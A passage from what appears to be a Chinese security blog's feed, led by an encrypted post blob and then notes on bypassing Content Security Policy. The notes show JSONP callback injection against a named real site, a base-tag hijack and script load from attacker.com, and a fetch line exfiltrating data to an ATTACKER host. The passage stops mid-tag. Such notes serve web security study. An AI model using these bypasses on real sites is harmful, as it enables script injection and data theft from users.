d805e9b9c4d8515101ca4f21a1637265cc37d0291e67f23c1a2752094edc75ec0db27dd8c2a5fedbad829b50d28c984eacc1938da4c6342cef6a8dbbdb6d64826e307679ddb3c885f55614926e020bae3a211bce23ce20f6e9190019343666197b51cea95c5bc507953879ab4c19413b74f1dabf0c1b3395ee8d2af6b86d170f8e261d51c0bfc0265f14029d8fedbd22a1e4a107b84287a6be54f438c285d4e4a8287444d3f89cbad7800822c3c422c0530921124423c48b648c42d8537b7c6979aed64683fc2efb053cfe1aad0d29336cd62440c97addccd514346ad067c061ae7825388a7376dab7f124661bb622f0378c8fd036caf7d5afcaa40ff56ddbe63c82f6e3f1578a1cb96298174c2a71ad21806518266bd45dbb78e04cee5b9569f01ce6fe0e985f1645101462eb32a767255ec702ba083815bc4de276ed5ff25c3d18ad64afa4312af1c7568e3025eb5b673fa28eee09463d8248ef235c44ea3212e884e1cad49f6796be20f00f0079210a5a2ce787e4153a1ac09a3790f684710df12baa56b1e5fd27cd08da090914839c1e8329db82f6fc86607bdcdd1caed9a3428c245b8faae9083da0f4d4c771b44f93d60ddaa9bc0d48589cfaf7abf3bb1151564e99d42c633e5eb8dd25c7d31bbe968e81d36f2e4fdc504ca02ef7f2c75be53e3ecbc6f0287aa6e26de141c855c27906ea299559cac67b3e28c0bd08f501dec193558d0f3588b547961cf8665c810882e03119ab1e3ccf4fe6462989c4a5428af7b09081032a82f0fd19e74e4dc9a15ff80df362c718d820a29ea16417dfaabf93f3d967e8457a9608eb823be20c2169240cc858502ff4b308bb42abd7cbe8c42b7c8294c6a28c85d3f4e868f64442a9f3bcdfe01e14252b9b09ff57d40b1b4a82fe8f6cb0056dc2c885c763377947ac360f91999feb9c10aead191cfab0b9be12db6020efbae3f679f9ecbfd4c8535316c77bb844e1b21d3f728945e730344fdfb8556c0559c5acb31eacaaf4fc72b0f733c7847f8146bb94f9d52a2069b96f435d95396ca63f55582b7e436a01d087b659857010f53b479823d76e02286ece3a17c2ef138801fe90182e912de053ce08d4d8cc5531a0651207b68db5550ce3b17e3da8709290b2223f9a1648413755b6d14336b3d651d7fddba04e5a2b3eff0673ecda6044b17a8ff6b995925aca27f0d35d2e115752dd54dc56f1396c1f1106291a60a384910d90041dd3ad565315c5f089bb76b33904dd5dca0b617642db95f1f8c1916b6e09de8e4cfa21a1e5958603b0323a2357dd67a351f14fee5d48e360590bf57cb2742a81691939e35b1a96f0f3c413790e0d0f876176368f766cbf0fe3b2ff8f0cffb95d895e31633be870dda1f7473d061f891800bcf9422581afb20151e6aa3f4a7043b48f41e1666c7503acc0b60ca0aec7959b76d924213bed85dc3704ce73ec8dc24235d4f9ce2e74441c45ae81d6b60856882537c42d60510491db781e007476ae34385b4bd057b510a81185f226c72c79cbd3dcfc2a4cd01ae53d5a85fc201222f29971867ceb9447c72a6c39c961ba7ccda62bae9cf727ca6eefa72b944d01e89e5fb103ef4c9a90a1a2f2cd2392ed597cbd5333c2361843fd1fa5ea0bc7d6d6c4a73fad091bcfa6c945083024b4b945479f1ba3aa13acb20617ff1ad217d85d0b8048e4164763cebe23e1944c13caf9e5d191c0fdaec071d3490f4a530366bd51d6fe79393bec971d760d22970df4598cdeec85a3f2661c444e296484c0ec099598eeb38fd7724aff35443c68164678c2258bf6a7cd22391be9b47723ac9c6ea66d1aed6db332b357527f5bcb1e6baf12fd413c1df1f8637be14d816fa69f78f63fa76647d87212e2057712ab4ffafb2ef5b4a4a84a6bbc187d059376ecea6309e067be6670510a283c337f41af12755ac18c223e86719502f8bc56791c9a33be4ff8cbfac730167c84bd433850a853348b4a0837142383352d3d52607b9fb94dfa0119703faa345c184aac2bb3529284739640198200d31db7224ff21a9950c843eb329300b069b91523587c01755efb7be90a59450cd6b34d7341171eebd7b62adc5f023698f7d9d52608aab007e78d33f5b5ba76a7b5fde8afb03a5b1e977bb0c7ed11425de8024752c43ba83eb298ef6314163cdefc760e534ea98ac8317991eb21b8bfaf7ec07feebe001f3e42e92b19bebbdf88417d90e9524c2939961e3232ee68eab5ae0e533269ffd6f6d53e961296d8c222e5dc484621bbad7f846e65515b88e99229881bfe3d96e524a2168088f11586634df43e9daee1dde988d05ea1d4f96f69931fa30a35d3f0f28609856693e79d86d47c766b38398e12a43cbb58c827c4fe9e03e0c987f897ca28efc01c47a6f9ee1c163d7a10a86f7f403d55f0f179586195c6d4bdbdbd4fd866d2fb0620dbf7d590e85bbc4b614379f5be45b138595c0d50d06a63e5ae1e36180ccc48f4e35d19b87ff6af084019c86f4164713b328a46d1f9342f5b59e8849c85105fc96c162b78c9df3cde7d07a6cea142b7a525479132204513464c17404b73808ad7b6849ac73654861715aa55f0470a78837979415a702631c46d4c448bbadfe900fdb15fea197dfaeddfc55ba58bfe96c9d8eca7a81e1115c41a9baa8dbc3b3c2d0a99b4062daa66d5259af8f7eefe2c1af8b2fd7790964202480c26fb84c870f6cc3140a6b517dd6af2417582b400a8354080f0bb5f9fcc97d8a09442a3bbe658d95aad05b5321360a837de7a37598b3c5bce6f21d84ee168248394e9ab647aed0d0ab1fa89c92a444a81d7691fccc441c419f6ddd261ce050440905cdd655045bd95fd3f012a4a78219965b7021b373b2d25eff2e18ab0761e8b866e124a1c5c8af17a43566fc05a6aac5660c44b8d4842660ecd391adaa7560a16ade1acebec5b494c494f77b4f975dc7f56e86720e62538a1df5b72545b46272685fea3b8acd7c077e2c7f8fa95fec104846ed7c1f6edef97a0b387bc9c78871c5b53f97d758fd822860369c08960750237fe518e7200ecc2f7aa47335f613e3e18f8bf1321c75a1565a9cc827878d56fd9f0afd55d931836e548a203825d1f394af94de265be5bf6dc981fe81bca339735e95d1ad2675d10b6f4d9980e0996565b8841fdc586dd35b0a2766c232ed1b462562b474c4aa07001d5cf99837b1259e483d3d8e19619ecf73d91350c6fa0cf3f668b76a899b15d4adffacd3bb196f36dc3808e08e3ca7900b7d6b548f32501b3c11427c84554331be42adf314a0a44b1a56c5ab2ccbc93edf6554593064c99336ec0c5cf16ce63ec88b2ad16fba3a357825e35de3b22aed6e9ddc73f2505b55b2f93f6bd5b81ebfdb592efc14118f3b3f2fff760db93fae07d3d2a36e4908508e747c339fa5a67c4bc72c514276a86fbfdb355309482c8ecd5db3de508656fd43b09cf2df15102494d6c98ea692697bb00ec566ec336b5f77eeaf85e08bee18ea77543aa9a90b0de1fda740c6f322ca19ca58a40770ab648c3ade20c435b2966a4bc8fd738cf8e8a5b9ec3cee79c8dbe7f6f9f9067b9e77357aced258972900f9563a5d9ae6c67cfdbc9ff035af3218494a1fc9a32679b00a6ac3fc81ad0df81425e1a520c76a04b2b5adffe8113a6e24173a2de525ed7892cc8721c1798ae06c5931bf64056f775ef2c3f85f683ddd7e0e17c15be525db3f661fa1e178e148d682847b63be9eb055bed18f6479326bef23a45a9309296853be8a37d3cfe0fe274b6d372f7b6611164ed963f5dc8b9ed651d4accf64ee431826fdf0256c7d3427408bbd722ee183912f00e25ee8bf2ebe60e77a7e6a6d7d90d017dd59167973b989b129d7e85b161d839357469c90418e0215e2bfa7c5634c0c44b6e59611b2ef01ed17a2972a0a3be264557c16b5cafc8e34d9a920c6fae2b7e5e42f88fa87ba8324345fc252287538c1f23607c918905a56d1c500af6c7308665985293505cf4d737c5343c496cd3c06b65f21b60a71a734bc36073f403c8927c6b2a6e4e26a68b00b34705dcdf7157d80219ddde470fafdd1f4c761cb5632135a346b3d3a66f32f458749b0102c9074af3b7f7bf1c0789027b2771f9647d4a434f6f7f706f5b9ae2e0b041ca4fe9d32d7fa0d435f28802a7a6887d9214988e8de437256916a159c61af77ac595f88483420ed46326e3239a0d61163098a2518d9381cd192adee52b732e905ca253a8c3f463e31fd516a2a7745807386fd131f8bb8eaf1ffca56b3e96eea75513932f449156182bcd4da1dd6701b41add5e0ca26fa210da398b69cb85d273283d5748234d8b6129fa685577a39a2b828d5cf2728661b7d873434d4ccaa1b861e191213eb3d0c031b86c687c25147e21274432c4b6de6b2dd45db322d3736a00ee8ced13a2e8d90c146a20b319f6f0d9a0a7e25c71ea169eefcac489a60210cdaccc039dfda6197048222ab785452a0000edcd07e06f0db422d02486a294b12aad3770e45b14baddb7210fb93f859a5185822e96fb7fd3f7a527f8b721fb2a6669f9dc4e12c82b2d8ef334e320f10bd36498e4f51e3d146c67befdf7b6e8a79fb2f0d173ae732ff20c2c4880ef31641e848fb2025f107e102047b728a0f89016c8fe9f42285495ee575c50f71d96f24d74478ccf7a4c1e6b7c138b46595a82e94427b5cbb3c5ddb6b516cf454ccfa7f20500731f3b35afd54800e5b69cd68aa74d1fab2cc40b94ae0d3c4e3d9b5383e08646ff4ea1f5c7d0175e63c56496b288776624848fb5305b163ab7c777deabadd43147a960b8653ebb01997f2a906a60edfe8c4d899c7b080ded1ed793f1931c7b22cb6310cf0d4309006cd39ff0712ba5ba55eefef9812d9d146ed82bcd046460203bfd5086863bff5ae165d36b0b1e07dbab3d539353f14b6d1cea0b76ccf2fc34cac44dd0e430010fb8aab363f7ce1e7130dfe44cc245afa92bb1be1e6a5f201227dfc27ac774d4074a2a5536722c2dcd8215567d830e0a692c7e707c0dc9cb1c61d3a7bf8f5a6e50ef874dd98dc1ab458bab55855a31edf026bb4b6c005c7ae7b1b8094269c2ff6016c9ec0aafa6922c8beb1130859d7eb30eacfbc796c8cdae61f82c9f54f6b516da5777b9452c371cc866bce6907902961f95ac2990316745d0c55d5af5647ef12f0024f26203052f8e91f2813b0ce867bf57b9d166d46409d98e506a04f5025d8f815c16711502b8221f1a5da6a79548b4c0ce7eb489cf97f8f99a461faa0f9edfd76f97e11de0fdbe6fb3214818ca9e1f1951e09ecbc351f70cd8182d9e70cb27a09d80b3f7b95400c1e597da900d01aefc7b92b444914be94468cadf512bbbab137b3b46f8f1ef90c8a27f6c6f70c809a3f8a07f7239476ab19cc162d0f4bd836027324b3e1814ad9ee278784cc75e1726d60740ce61426c56bc9f2f656c7a04f29345c8af0ba0aa6a6228040a89b96e5d6457014b73bec0e3631a1cc532682c7634cef250473331652c4a0f244df778552a9106fce3bc45661fb2a5a56fd9c02ab151353b6e54877900224cca3b9ddee0b99a09ea85169e5cfe236530dbe85870b1f24011f42df9da21408da67142f585dd3501233f59552c64c832ab189aa060947c59ce3e012a61385dcd3cd5d7dc3ce6458022ef3fc9f8d70605727d292b5792c277221605cc58e5b4ab73d93d279cf5c48023dce764749afc435a9a2c25bb2e925b53e454f0ca4c2dc9292218c9cd79e1ff8ba88ae951049972592ecb438e522cc21c8bf0dfeb74d48b7ab2b8f4b6cebec3db518ce57345b92565273373891a0dc205da3b45eb2b0b73e81888a1c6f3c2341cd5fcf9730be1286914a87b3a71c9b4031e787b288daa2a07d25f60ac243744d816dedee1c5c518a35e229555fb55dd5e66d4452ff7ff0cad34a54e003feb10910c5da075fcdba879179eec8a7b038aa6cf986f8546b0ea1129c3d5d249887abb1800c98eedb149f0ba1113d5641d22d8bf573fe90af3ab8ccff6bbc1269249f00020c29ebef615976ab15b43ab02c3f55a2d7299372fc351dfbe372012ec4be92ca02a45ae246c83df356a27cdba8936dc86fa3e8eeb2bc0642537973c088b9a135465a25210ef27830e8de1c03b417aca2e18ca0375587f4cd6e79d87ada6eaa8b44c23399864a5bfd24c7acaa47722078bd55914e2846067822ee4092c65f09637d01cbc9d3fe0832afa8e1a6a03ea57f22c95a9cbe8e9eaccd15e0c24e39a59ba44f284971ce710407aadf3c41b9558795945fa1895e04011ad62400d33080f058b6f6c1034242fdd02c5bed099cf32f613c0a78bc095c895657d1e653a4819ae274e039164ea726f37ef5bf719423790ae4442dec57852de722fe5e829cca3c02084333dee5d688d0260b4e9eb458411293dcbfc2b2a26e9c89d8cb5c9e3c90f9a055af598e4eb8de1b0202ecf0b94375be7d040d7f507cede8cb51262e1124f1bbe0455a4c1e055b060b1972ff476ea67c032ecd199f199b05db462b1f49f2ea84f2aef9ce21b1058166825f888817aa5ae475ad3e1a250f39120bfe4ac9e375890674c11f9194ca54395970b9d5de15761eb1397fe780c874e41878f43b489f206be8e230c09dd0b96377f4159e7a4c3b80cb155ab8561523c3839e34fd8aed8fd6c9475fd117e662c514e1b7e120deffef9f845559670fb22afde7c0c8ab920bef4c4188e3273f8506e93c0f101affa959ba66a6d4bc684f052feee8911df1e4a2cb177f6e4f094cb9ff0bdebedde9c9379e5d403448d5a5e341eea4444f2eb3209ab367e96fbb29189387591d99708705025b80069c7265ebf6b00e737dc9c76262e431f9271da30db0876e253af31979352b47edc98de0ceeabc08264d8828f4ffc535f38648a299e603ca04abeace2f9f1b3fd0fd199edf5c5554af513b6582719f89977a162e6e5df7e3fb315064285b9208696e491f61b8338b4f730df748dfd9637659638826c2d30177b291fe72d18d46a7235d5158afa7005e44e2e2f6c67674ff22292287fb0fd9872a539a85722894d95d77d1ffce470931f61248da70a66165145c59f66f1068cf3bdcca0415776379bad67489d1da98fac22255101bdd5151dbcd3f8c91ef58c4fafc7b618fd15f10b64d8868599b5e88cc4fe78caa369386cfc363e95674b7daf26a260cd5b5d9201c0b3b237d7c1b20b57d6b2e32e8290f8bbc44544ba5f8dbd3c7eba2612e92d3a6a717b4935e8a01eadb4bf783e50f537eb293be84653bce6a3a29055dbebc7753a5d26b855d9a9986c01b622e6573929a30087be357902d58fe5ebf4e0600be66703ee337676167d7d68bf6a023fd7995c2a8438e8f2eb5a49b469d28922d3cdec31544abda1fd0e58541fd1c718ce0eeb746f8dfc228f3716429ec54d116e067456c340d2a9b65837671b9c6d6e5eebfd8de0e85178194fd5bd3442c5ebc8adcae1239071187cb756aa5459d03a8021f4dffa8809d061ba404a9c38532136fb7888fba95bf29e3f9471cb5b96ee059f19e232a824417a88560b76aa03e3f6b10a6a02ee2e28579d14a1eca1ebed65d0eef3896780aaabfc0c3e9e422b48a653e90f498462444feb5acf2ef51dc579e60dbe1c3f942ae9915c7b6d9a9ec1a7628d762bbba9eef83971d25bbf3b7779e57d1263271078c58b3decbf00c640d334c4a35f9efce71bf90714df7036969041065b88bc0401b461920aedf686e3e7320fbcbd504c4b2cb9d700840b6464f881e93a110e7142e453710c5aaf089ed04b79b27176c179385a152d65743031fd2a4fee2196ad402ce93f24dcda37cca9df0ff3bd8d17f84b43dd5350f7281a554231a0c8f4fb4c78f128f255834741d559e896562b850b8e2b0568ff15095f6be4a67add437fc02e235a54a469fc4edbda7df1be653cd9fb671d8b322f5090fb93a8e5f926bd51c8893a9bf8a34fd1b24357900f78999c8ae36eb7195916f396a8f4eb8c2a60877cbd04ffaf2f4beaa81a7cc810be56e1b185d171121de48e854d0be9d07b677a17e3462a0e29e67c038db8d8ff8c67f9cf19cdda9982082d3fa0208574b683b257d84aef2781697a76e906ef63eadad8a0be5c225c821fa56ac3365461e74027ed12a5959ce482e5120fd32e0d308d16a1ee119050c81abbc9cdbd28b40b0409c54bb222ebca41d7e42d99e5a402843711edb050241edebd35735b53fdd5a7d79f2181bd980a2855c42886de63e2b0c75e1cdff</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">密码</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
  </entry>
  <entry>
    <title>前端安全6-CSP绕过（笔记）</title>
    <url>/2023/10/02/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A86-CSP%E7%BB%95%E8%BF%87%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>绕过csp的一些方法</p>
<ul>
<li><a href="https://ithelp.ithome.com.tw/articles/10316449">https://ithelp.ithome.com.tw/articles/10316449</a><span id="more"></span>
</li>
</ul>
<h1 id="不安全的domain"><a href="#不安全的domain" class="headerlink" title="不安全的domain"></a>不安全的domain</h1><p>有一些三方库存在0day<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/CanardMandarin/csp-bypass</span><br></pre></td></tr></table></figure><br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;script-src https://unpkg.com/&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">userContent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://unpkg.com/react@16.7.0/umd/react.production.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://unpkg.com/csp-bypass@1.0.2/dist/sval-classic.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span> <span class="attr">csp</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h1 id="通过base标签绕过"><a href="#通过base标签绕过" class="headerlink" title="通过base标签绕过"></a>通过base标签绕过</h1><p>假设加上了nonce，且无法被猜测<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;none&#x27;; script-src &#x27;nonce-abc123&#x27;;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">userContent</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- xss --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://attacker.com/my.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">abc123</span> <span class="attr">src</span>=<span class="string">&quot;app.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br>这样就会无法加载<code>my.js</code><br>但是如果用下面的代码<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;none&#x27;; script-src &#x27;nonce-abc123&#x27;;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">userContent</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- xss --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">&quot;https://attacker.com/&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">abc123</span> <span class="attr">src</span>=<span class="string">&quot;app.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br>通过改变base，然后去加载攻击者的<code>app.js</code><br>修复方法就是用上一章里面有的<code>base-uri &#39;none&#39;</code></p>
<h1 id="JSONP绕过"><a href="#JSONP绕过" class="headerlink" title="JSONP绕过"></a>JSONP绕过</h1><h2 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h2><p>因为同源策略，如果想向其他网站取出数据，通过下面的代码是无法取出数据的<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;http://example.com/&#x27;</span>)</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function">(<span class="params">response</span>) =&gt;</span> response.<span class="title function_">text</span>())</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function">(<span class="params">data</span>) =&gt;</span> <span class="title function_">btoa</span>(data))</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function">(<span class="params">data</span>) =&gt;</span> location.<span class="title function_">replace</span>(<span class="string">`http://ATTACKER/?data=<span class="subst">$&#123;data&#125;</span>`</span>))</span><br></pre></td></tr></table></figure><br><img src="/2023/10/02/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A86-CSP%E7%BB%95%E8%BF%87%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/1.png" alt><br>会爆出上面的错误，但是加载别人的js代码是没问题的<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type: application/json&#x27;</span>);</span><br><span class="line"><span class="comment">//获取回调函数名</span></span><br><span class="line"><span class="variable">$jsoncallback</span> = <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_REQUEST</span> [<span class="string">&#x27;jsoncallback&#x27;</span>]);</span><br><span class="line"><span class="comment">//json数据</span></span><br><span class="line"><span class="variable">$json_data</span> = <span class="string">&#x27;[&quot;customername1&quot;,&quot;customername2&quot;]&#x27;</span>;</span><br><span class="line"><span class="comment">//输出jsonp格式的数据</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$jsoncallback</span> . <span class="string">&quot;(&quot;</span> . <span class="variable">$json_data</span> . <span class="string">&quot;)&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>别人调用一个函数，函数名是你自己的请求的，然后你这边把函数设计一下就行了<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>JSONP 实例<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;divCustomers&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">callbackFunction</span>(<span class="params">result, methodName</span>)</span></span><br><span class="line"><span class="language-javascript">&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> html = <span class="string">&#x27;&lt;ul&gt;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; result.<span class="property">length</span>; i++)</span></span><br><span class="line"><span class="language-javascript">    &#123;</span></span><br><span class="line"><span class="language-javascript">        html += <span class="string">&#x27;&lt;li&gt;&#x27;</span> + result[i] + <span class="string">&#x27;&lt;/li&gt;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    html += <span class="string">&#x27;&lt;/ul&gt;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;divCustomers&#x27;</span>).<span class="property">innerHTML</span> = html;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://www.runoob.com/try/ajax/jsonp.php?jsoncallback=callbackFunction&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><p>这段代码是我从runoob抄下来的，他加了个htmlspecialchars，但是并没有什么卵用，直接绕<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://www.runoob.com/try/ajax/jsonp.php?jsoncallback=alert(1);callbackFunction&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><br>有一个仓库收集了一些jsonp，可以被绕过<br><a href="https://github.com/zigoo0/JSONBee">https://github.com/zigoo0/JSONBee</a></p>
<p>所以真正的过滤应该是，只允许<code>a-zA-Z.</code>这些字符<br>但是这样其实也有办法可以绕过<br><a href="https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/">https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/</a><br>参考这个文章，如果某个按钮出现了问题，你可以通过获取他的元素，然后click()<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;a&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span>点击弹窗<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">firstElementChild</span>.<span class="title function_">click</span>()</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br>如果是个jsonp，那么就是<br><a href="https://www.runoob.com/try/ajax/jsonp.php?jsoncallback=document.body.firstElementChild.click">https://www.runoob.com/try/ajax/jsonp.php?jsoncallback=document.body.firstElementChild.click</a></p>
<h1 id="重定向绕过"><a href="#重定向绕过" class="headerlink" title="重定向绕过"></a>重定向绕过</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;script-src http://localhost https://192.168.3.16/a/b/c/d&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span 